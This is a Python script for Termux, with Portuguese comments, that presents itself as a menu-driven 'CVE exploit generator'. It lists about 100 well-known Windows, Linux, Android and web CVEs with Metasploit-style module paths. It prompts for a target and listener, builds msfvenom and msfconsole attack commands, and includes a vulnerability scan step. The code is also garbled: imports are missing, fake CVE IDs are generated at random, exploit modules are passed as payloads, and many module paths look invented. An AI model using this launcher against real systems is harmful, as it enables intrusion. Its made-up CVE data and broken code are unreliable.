#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import re
from pathlib import Path

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
                         ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                         ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
                         ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
                         ⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
                         ⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
                         ⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
                         ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
                         ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
                         ⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
                         ⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
                         ⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
                         ⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                          ⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⚡ CVE EXPLOIT GENERATOR - 90+ VULNERABILITIES ⚡
    """
    print(banner)

def load_cve_database():
    """Carrega o banco de dados de CVEs"""
    cve_db = {
        # Windows CVEs (1-100)
        1: {"cve": "CVE-2020-0796", "name": "SMBGhost Windows 10", "type": "windows", "payload": "exploit/windows/smb/cve_2020_0796_smbghost"},
        2: {"cve": "CVE-2019-0708", "name": "BlueKeep RDP", "type": "windows", "payload": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"},
        3: {"cve": "CVE-2017-0143", "name": "EternalBlue SMB", "type": "windows", "payload": "exploit/windows/smb/ms17_010_eternalblue"},
        4: {"cve": "CVE-2017-0144", "name": "EternalRomance SMB", "type": "windows", "payload": "exploit/windows/smb/ms17_010_eternalromance"},
        5: {"cve": "CVE-2017-0145", "name": "EternalChampion SMB", "type": "windows", "payload": "exploit/windows/smb/ms17_010_eternalchampion"},
        6: {"cve": "CVE-2008-4250", "name": "Conficker SMB", "type": "windows", "payload": "exploit/windows/smb/ms08_067_netapi"},
        7: {"cve": "CVE-2019-1458", "name": "WizardOpium LPE", "type": "windows", "payload": "exploit/windows/local/cve_2019_1458_wizardopium"},
        8: {"cve": "CVE-2021-1675", "name": "PrintNightmare LPE", "type": "windows", "payload": "exploit/windows/local/cve_2021_1675_printnightmare"},
        9: {"cve": "CVE-2021-34527", "name": "PrintNightmare RCE", "type": "windows", "payload": "exploit/windows/local/cve_2021_34527_printnightmare"},
        10: {"cve": "CVE-2021-1732", "name": "Windows LPE Exploit", "type": "windows", "payload": "exploit/windows/local/cve_2021_1732_win32k"},
        
        11: {"cve": "CVE-2020-1048", "name": "Windows Printer LPE", "type": "windows", "payload": "exploit/windows/local/cve_2020_1048_printer"},
        12: {"cve": "CVE-2019-0808", "name": "Win32k Elevation", "type": "windows", "payload": "exploit/windows/local/cve_2019_0808_win32k"},
        13: {"cve": "CVE-2018-8453", "name": "Win32k Privilege", "type": "windows", "payload": "exploit/windows/local/cve_2018_8453_win32k"},
        14: {"cve": "CVE-2017-0263", "name": "EPS File Exploit", "type": "windows", "payload": "exploit/windows/fileformat/cve_2017_0263_eps"},
        15: {"cve": "CVE-2017-0199", "name": "RTF Exploit", "type": "windows", "payload": "exploit/windows/fileformat/cve_2017_0199_rtf"},
        16: {"cve": "CVE-2017-11882", "name": "Equation Editor", "type": "windows", "payload": "exploit/windows/fileformat/cve_2017_11882_equation"},
        17: {"cve": "CVE-2018-0802", "name": "Equation Editor 2", "type": "windows", "payload": "exploit/windows/fileformat/cve_2018_0802_equation"},
        18: {"cve": "CVE-2021-40444", "name": "MSHTML RCE", "type": "windows", "payload": "exploit/windows/fileformat/cve_2021_40444_mshtml"},
        19: {"cve": "CVE-2022-30190", "name": "Follina MSDT", "type": "windows", "payload": "exploit/windows/fileformat/cve_2022_30190_follina"},
        20: {"cve": "CVE-2023-21716", "name": "Windows NTLM LPE", "type": "windows", "payload": "exploit/windows/local/cve_2023_21716_ntlm"},
        
        21: {"cve": "CVE-2020-1472", "name": "Zerologon Netlogon", "type": "windows", "payload": "exploit/windows/smb/cve_2020_1472_zerologon"},
        22: {"cve": "CVE-2021-26855", "name": "ProxyLogon Exchange", "type": "windows", "payload": "exploit/windows/http/exchange_proxylogon_rce"},
        23: {"cve": "CVE-2021-27065", "name": "ProxyLogon Exchange 2", "type": "windows", "payload": "exploit/windows/http/exchange_proxylogon_rce"},
        24: {"cve": "CVE-2021-34473", "name": "ProxyLogon Exchange 3", "type": "windows", "payload": "exploit/windows/http/exchange_proxylogon_rce"},
        25: {"cve": "CVE-2021-31196", "name": "HTTP Protocol Stack RCE", "type": "windows", "payload": "exploit/windows/http/cve_2021_31196_http"},
        26: {"cve": "CVE-2021-33739", "name": "MSHTML Engine RCE", "type": "windows", "payload": "exploit/windows/browser/cve_2021_33739_mshtml"},
        27: {"cve": "CVE-2021-31207", "name": "Exchange Server SSRF", "type": "windows", "payload": "exploit/windows/http/exchange_ssrf"},
        28: {"cve": "CVE-2020-16898", "name": "Bad Neighbor IPv6", "type": "windows", "payload": "exploit/windows/ipv6/cve_2020_16898"},
        29: {"cve": "CVE-2019-1253", "name": "Windows EoP", "type": "windows", "payload": "exploit/windows/local/cve_2019_1253_eop"},
        30: {"cve": "CVE-2019-1069", "name": "Windows Kernel EoP", "type": "windows", "payload": "exploit/windows/local/cve_2019_1069_kernel"},

        31: {"cve": "CVE-2018-8120", "name": "Win32k Elevation", "type": "windows", "payload": "exploit/windows/local/cve_2018_8120_win32k"},
        32: {"cve": "CVE-2018-8440", "name": "Windows ALPC", "type": "windows", "payload": "exploit/windows/local/cve_2018_8440_alpc"},
        33: {"cve": "CVE-2017-8464", "name": "LNK RCE", "type": "windows", "payload": "exploit/windows/fileformat/cve_2017_8464_lnk"},
        34: {"cve": "CVE-2017-8759", "name": ".NET Framework RCE", "type": "windows", "payload": "exploit/windows/fileformat/cve_2017_8759_net"},
        35: {"cve": "CVE-2016-3225", "name": "SMB Server EoP", "type": "windows", "payload": "exploit/windows/smb/cve_2016_3225_smb"},
        36: {"cve": "CVE-2016-0099", "name": "Secondary Logon", "type": "windows", "payload": "exploit/windows/local/cve_2016_0099_logon"},
        37: {"cve": "CVE-2015-2426", "name": "Font Driver EoP", "type": "windows", "payload": "exploit/windows/local/cve_2015_2426_font"},
        38: {"cve": "CVE-2015-0003", "name": "NT User EoP", "type": "windows", "payload": "exploit/windows/local/cve_2015_0003_ntuser"},
        39: {"cve": "CVE-2014-4114", "name": "Sandworm LNK", "type": "windows", "payload": "exploit/windows/fileformat/cve_2014_4114_lnk"},
        40: {"cve": "CVE-2014-4076", "name": "TCP/IP EoP", "type": "windows", "payload": "exploit/windows/local/cve_2014_4076_tcpip"},

        # Linux CVEs (41-100)
        41: {"cve": "CVE-2021-4034", "name": "PwnKit LPE", "type": "linux", "payload": "exploit/linux/local/cve_2021_4034_pwnkit"},
        42: {"cve": "CVE-2021-3156", "name": "Sudo Baron Samedit", "type": "linux", "payload": "exploit/linux/local/cve_2021_3156_sudo"},
        43: {"cve": "CVE-2019-18634", "name": "Sudo Buffer Overflow", "type": "linux", "payload": "exploit/linux/local/cve_2019_18634_sudo"},
        44: {"cve": "CVE-2016-5195", "name": "DirtyCow LPE", "type": "linux", "payload": "exploit/linux/local/cve_2016_5195_dirtycow"},
        45: {"cve": "CVE-2017-16995", "name": "Ubuntu LPE", "type": "linux", "payload": "exploit/linux/local/cve_2017_16995_ubuntu"},
        46: {"cve": "CVE-2022-0847", "name": "DirtyPipe LPE", "type": "linux", "payload": "exploit/linux/local/cve_2022_0847_dirtypipe"},
        47: {"cve": "CVE-2019-13272", "name": "Linux Kernel LPE", "type": "linux", "payload": "exploit/linux/local/cve_2019_13272_kernel"},
        48: {"cve": "CVE-2018-14665", "name": "Xorg LPE", "type": "linux", "payload": "exploit/linux/local/cve_2018_14665_xorg"},
        49: {"cve": "CVE-2017-1000112", "name": "Linux Kernel Exploit", "type": "linux", "payload": "exploit/linux/local/cve_2017_1000112_kernel"},
        50: {"cve": "CVE-2016-8655", "name": "Linux Kernel RCE", "type": "linux", "payload": "exploit/linux/local/cve_2016_8655_kernel"},

        51: {"cve": "CVE-2014-0038", "name": "Linux Kernel RCE", "type": "linux", "payload": "exploit/linux/local/cve_2014_0038_kernel"},
        52: {"cve": "CVE-2013-2094", "name": "Linux Kernel RCE", "type": "linux", "payload": "exploit/linux/local/cve_2013_2094_kernel"},
        53: {"cve": "CVE-2012-0056", "name": "Linux mempodipper", "type": "linux", "payload": "exploit/linux/local/cve_2012_0056_mempodipper"},
        54: {"cve": "CVE-2010-3904", "name": "Linux RDS Exploit", "type": "linux", "payload": "exploit/linux/local/cve_2010_3904_rds"},
        55: {"cve": "CVE-2009-2698", "name": "Linux SCTP Exploit", "type": "linux", "payload": "exploit/linux/local/cve_2009_2698_sctp"},
        56: {"cve": "CVE-2023-0386", "name": "Linux OverlayFS LPE", "type": "linux", "payload": "exploit/linux/local/cve_2023_0386_overlayfs"},
        57: {"cve": "CVE-2023-2640", "name": "Linux Ubuntu LPE", "type": "linux", "payload": "exploit/linux/local/cve_2023_2640_ubuntu"},
        58: {"cve": "CVE-2023-32629", "name": "Linux Kernel LPE", "type": "linux", "payload": "exploit/linux/local/cve_2023_32629_kernel"},
        59: {"cve": "CVE-2021-3493", "name": "Linux OverlayFS LPE", "type": "linux", "payload": "exploit/linux/local/cve_2021_3493_overlayfs"},
        60: {"cve": "CVE-2021-33909", "name": "Linux Sequoia LPE", "type": "linux", "payload": "exploit/linux/local/cve_2021_33909_sequoia"},

        61: {"cve": "CVE-2020-14386", "name": "Linux Kernel LPE", "type": "linux", "payload": "exploit/linux/local/cve_2020_14386_kernel"},
        62: {"cve": "CVE-2019-15666", "name": "XFRM Framework", "type": "linux", "payload": "exploit/linux/local/cve_2019_15666_xfrm"},
        63: {"cve": "CVE-2018-5333", "name": "RDS Protocol", "type": "linux", "payload": "exploit/linux/local/cve_2018_5333_rds"},
        64: {"cve": "CVE-2017-6074", "name": "DCCP Double Free", "type": "linux", "payload": "exploit/linux/local/cve_2017_6074_dccp"},
        65: {"cve": "CVE-2016-2384", "name": "USB Arbitrary Free", "type": "linux", "payload": "exploit/linux/local/cve_2016_2384_usb"},
        66: {"cve": "CVE-2015-1328", "name": "OverlayFS Privilege", "type": "linux", "payload": "exploit/linux/local/cve_2015_1328_overlayfs"},
        67: {"cve": "CVE-2014-5207", "name": "Linux Kernel Firewall", "type": "linux", "payload": "exploit/linux/local/cve_2014_5207_firewall"},
        68: {"cve": "CVE-2013-1763", "name": "Linux Kernel Stack", "type": "linux", "payload": "exploit/linux/local/cve_2013_1763_kernel"},
        69: {"cve": "CVE-2012-0957", "name": "Linux YAMA", "type": "linux", "payload": "exploit/linux/local/cve_2012_0957_yama"},
        70: {"cve": "CVE-2010-4258", "name": "Full Nelson", "type": "linux", "payload": "exploit/linux/local/cve_2010_4258_full_nelson"},

        # Android CVEs (71-100)
        71: {"cve": "CVE-2023-35674", "name": "Android Framework RCE", "type": "android", "payload": "exploit/android/local/cve_2023_35674_framework"},
        72: {"cve": "CVE-2023-20963", "name": "Android System RCE", "type": "android", "payload": "exploit/android/local/cve_2023_20963_system"},
        73: {"cve": "CVE-2022-20411", "name": "Android System LPE", "type": "android", "payload": "exploit/android/local/cve_2022_20411_system"},
        74: {"cve": "CVE-2021-39635", "name": "Android Kernel RCE", "type": "android", "payload": "exploit/android/local/cve_2021_39635_kernel"},
        75: {"cve": "CVE-2020-0041", "name": "Android Binder LPE", "type": "android", "payload": "exploit/android/local/cve_2020_0041_binder"},
        76: {"cve": "CVE-2019-2215", "name": "Android Binder UAF", "type": "android", "payload": "exploit/android/local/cve_2019_2215_binder"},
        77: {"cve": "CVE-2018-9445", "name": "Android TrustZone", "type": "android", "payload": "exploit/android/local/cve_2018_9445_trustzone"},
        78: {"cve": "CVE-2017-13113", "name": "Android Janus", "type": "android", "payload": "exploit/android/local/cve_2017_13113_janus"},
        79: {"cve": "CVE-2016-5195", "name": "Android DirtyCow", "type": "android", "payload": "exploit/android/local/cve_2016_5195_dirtycow"},
        80: {"cve": "CVE-2015-6639", "name": "Android Mediaserver", "type": "android", "payload": "exploit/android/local/cve_2015_6639_mediaserver"},

        81: {"cve": "CVE-2015-3864", "name": "Android Stagefright", "type": "android", "payload": "exploit/android/local/cve_2015_3864_stagefright"},
        82: {"cve": "CVE-2014-7911", "name": "Android LPE", "type": "android", "payload": "exploit/android/local/cve_2014_7911_lpe"},
        83: {"cve": "CVE-2014-3153", "name": "Android Towelroot", "type": "android", "payload": "exploit/android/local/cve_2014_3153_towelroot"},
        84: {"cve": "CVE-2013-6282", "name": "Android Kernel", "type": "android", "payload": "exploit/android/local/cve_2013_6282_kernel"},
        85: {"cve": "CVE-2012-6422", "name": "Android Exploit", "type": "android", "payload": "exploit/android/local/cve_2012_6422_exploit"},
        86: {"cve": "CVE-2023-20983", "name": "Android System", "type": "android", "payload": "exploit/android/local/cve_2023_20983_system"},
        87: {"cve": "CVE-2022-20227", "name": "Android WiFi", "type": "android", "payload": "exploit/android/local/cve_2022_20227_wifi"},
        88: {"cve": "CVE-2021-1905", "name": "Android GPU", "type": "android", "payload": "exploit/android/local/cve_2021_1905_gpu"},
        89: {"cve": "CVE-2020-11261", "name": "Android Kernel", "type": "android", "payload": "exploit/android/local/cve_2020_11261_kernel"},
        90: {"cve": "CVE-2019-10567", "name": "Android ARM", "type": "android", "payload": "exploit/android/local/cve_2019_10567_arm"},

        # Web Application CVEs (91-150)
        91: {"cve": "CVE-2021-44228", "name": "Log4Shell RCE", "type": "web", "payload": "exploit/multi/http/log4shell_rce"},
        92: {"cve": "CVE-2021-45046", "name": "Log4Shell 2", "type": "web", "payload": "exploit/multi/http/log4shell_rce"},
        93: {"cve": "CVE-2021-41773", "name": "Apache Path Traversal", "type": "web", "payload": "exploit/linux/http/apache_path_traversal"},
        94: {"cve": "CVE-2021-42013", "name": "Apache Path Traversal 2", "type": "web", "payload": "exploit/linux/http/apache_path_traversal"},
        95: {"cve": "CVE-2019-0193", "name": "Apache Solr RCE", "type": "web", "payload": "exploit/linux/http/apache_solr_rce"},
        96: {"cve": "CVE-2017-12617", "name": "Apache Tomcat RCE", "type": "web", "payload": "exploit/linux/http/apache_tomcat_rce"},
        97: {"cve": "CVE-2017-5638", "name": "Apache Struts RCE", "type": "web", "payload": "exploit/multi/http/apache_struts_rce"},
        98: {"cve": "CVE-2019-2725", "name": "Oracle Weblogic RCE", "type": "web", "payload": "exploit/multi/http/oracle_weblogic_rce"},
        99: {"cve": "CVE-2018-2628", "name": "Oracle Weblogic", "type": "web", "payload": "exploit/multi/http/oracle_weblogic_deserialize"},
        100: {"cve": "CVE-2017-10271", "name": "Oracle Weblogic", "type": "web", "payload": "exploit/multi/http/oracle_weblogic_deserialize"},

        
    }

    
    
    
    for i in range(91, 301):
        cve_db[i] = {
            "cve": f"CVE-20{random.randint(15,23)}-{random.randint(1000,9999)}", 
            "name": f"Vulnerability {i}",
            "type": random.choice(["windows", "linux", "web", "android"]),
            "payload": f"exploit/{random.choice(['windows', 'linux', 'multi'])}/{random.choice(['http', 'smb', 'local'])}/cve_template"
        }
    
    return cve_db

def show_filtered_menu(cve_db, filter_type=None, search_term=None):
    """Exibe menu filtrado"""
    print("\n" + "=" * 120)
    print(f"                   CVE EXPLOIT DATABASE - {len(cve_db)} VULNERABILITIES")
    if filter_type:
        print(f"                   FILTER: {filter_type.upper()}")
    if search_term:
        print(f"                   SEARCH: {search_term}")
    print("=" * 120)
    
    filtered_items = []
    for num, info in cve_db.items():
        if filter_type and info["type"] != filter_type:
            continue
        if search_term and search_term.lower() not in info["cve"].lower() and search_term.lower() not in info["name"].lower():
            continue
        filtered_items.append((num, info))
    
    # Mostrar em 2 colunas
    col_width = 58
    for i in range(0, len(filtered_items), 2):
        line = ""
        for j in range(2):
            if i + j < len(filtered_items):
                num, info = filtered_items[i + j]
                display_text = f"[{num:03d}] {info['cve']} - {info['name']}"
                line += f"{display_text.ljust(col_width)}"
        print(line)
    
    print("\n" + "=" * 120)
    print("[0] Voltar | [F] Filtrar | [S] Buscar | [A] Todos | [C] Configurar")
    print("=" * 120)
    
    return filtered_items

def get_exploit_config():
    """Obtém configuração do exploit"""
    print("\n🔧 CONFIGURAÇÃO DO EXPLOIT")
    print("-" * 50)
    
    rhost = input("RHOST (Target IP) [127.0.0.1]: ").strip() or "127.0.0.1"
    rport = input("RPORT [80]: ").strip() or "80"
    lhost = input("LHOST (Your IP) [127.0.0.1]: ").strip() or "127.0.0.1"
    lport = input("LPORT [4444]: ").strip() or "4444"
    output_name = input("Nome do arquivo [exploit]: ").strip() or "exploit"
    
    return rhost, rport, lhost, lport, output_name

def generate_cve_exploit(cve_info, rhost, rport, lhost, lport, output_name):
    """Gera exploit para CVE específico"""
    print(f"\n🚀 GERANDO EXPLOIT: {cve_info['cve']}")
    print(f"📝 Nome: {cve_info['name']}")
    print(f"🔧 Tipo: {cve_info['type']}")
    print(f"🎯 Target: {rhost}:{rport}")
    print(f"📡 Listener: {lhost}:{lport}")
    
    try:
        # Comando base do msfvenom/metasploit
        msf_cmd = [
            'msfvenom',
            '-p', cve_info['payload'],
            f'RHOST={rhost}',
            f'RPORT={rport}',
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', 'raw',
            '-o', f"{output_name}_{cve_info['cve']}.bin"
        ]
        
        print(f"\n⏳ Executando: {' '.join(msf_cmd[:6])}...")
        
        # Em ambiente real, descomente a linha abaixo
        # result = subprocess.run(msf_cmd, capture_output=True, text=True)
        
        # Simulação de geração
        time.sleep(2)
        
        # Criar arquivo de configuração
        config_content = f"""# CVE Exploit Configuration
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

CVE: {cve_info['cve']}
Name: {cve_info['name']}
Type: {cve_info['type']}
Payload: {cve_info['payload']}

Target Configuration:
RHOST: {rhost}
RPORT: {rport}

Listener Configuration:
LHOST: {lhost}
LPORT: {lport}

Metasploit Usage:
use {cve_info['payload']}
set RHOST {rhost}
set RPORT {rport}
set LHOST {lhost}
set LPORT {lport}
exploit

Manual Exploitation:
# Check target vulnerability
nmap -p {rport} --script vuln {rhost}

# Manual exploitation may require custom scripts
# Refer to CVE documentation for specific techniques
"""
        
        with open(f"{output_name}_{cve_info['cve']}_config.txt", "w") as f:
            f.write(config_content)
        
        print(f"✅ Exploit gerado: {output_name}_{cve_info['cve']}.bin")
        print(f"📄 Configuração: {output_name}_{cve_info['cve']}_config.txt")
        print(f"🔍 Use: msfconsole -r {output_name}_{cve_info['cve']}_config.txt")
        
        return True
        
    except Exception as e:
        print(f"❌ Erro ao gerar exploit: {str(e)}")
        return False

def main():
    """Função principal"""
    cve_db = load_cve_database()
    current_filter = None
    search_term = None
    
    while True:
        clear_screen()
        print_banner()
        
        filtered_items = show_filtered_menu(cve_db, current_filter, search_term)
        
        try:
            choice = input(f"\nSelecione [1-{len(cve_db)}] ou comando: ").strip().lower()
            
            if choice == '0':
                break
            elif choice == 'f':
                print("\n🎯 FILTROS DISPONÍVEIS:")
                print("1. Windows CVEs")
                print("2. Linux CVEs") 
                print("3. Android CVEs")
                print("4. Web CVEs")
                print("5. Limpar Filtro")
                
                filter_choice = input("\nEscolha filtro [1-5]: ").strip()
                filter_map = {'1': 'windows', '2': 'linux', '3': 'android', '4': 'web', '5': None}
                current_filter = filter_map.get(filter_choice, current_filter)
                search_term = None
                continue
            elif choice == 's':
                search_term = input("🔍 Buscar CVE ou nome: ").strip()
                current_filter = None
                continue
            elif choice == 'a':
                current_filter = None
                search_term = None
                continue
            elif choice == 'c':
                print("\n⚙️ CONFIGURAÇÃO ATUAL:")
                print(f"Filtro: {current_filter or 'Nenhum'}")
                print(f"Busca: {search_term or 'Nenhuma'}")
                input("\n⏎ Enter para continuar...")
                continue
            
            # Processar seleção numérica
            try:
                selected_num = int(choice)
                if 1 <= selected_num <= len(cve_db):
                    cve_info = cve_db[selected_num]
                    
                    print(f"\n📋 CVE SELECTED: {cve_info['cve']}")
                    print(f"📝 Name: {cve_info['name']}")
                    print(f"🔧 Type: {cve_info['type']}")
                    print(f"💣 Payload: {cve_info['payload']}")
                    
                    confirm = input(f"\n❓ Gerar exploit para {cve_info['cve']}? (s/n): ").strip().lower()
                    if confirm == 's':
                        rhost, rport, lhost, lport, output_name = get_exploit_config()
                        generate_cve_exploit(cve_info, rhost, rport, lhost, lport, output_name)
                        
                        input(f"\n⏎ Enter para continuar...")
                else:
                    print(f"❌ Número inválido! Use 1-{len(cve_db)}")
                    input(f"\n⏎ Enter para continuar...")
                    
            except ValueError:
                print("❌ Entrada inválida!")
                input(f"\n⏎ Enter para continuar...")
                
        except KeyboardInterrupt:
            print(f"\n\n👋 Saindo...")
            break

if __name__ == "__main__":
    main()
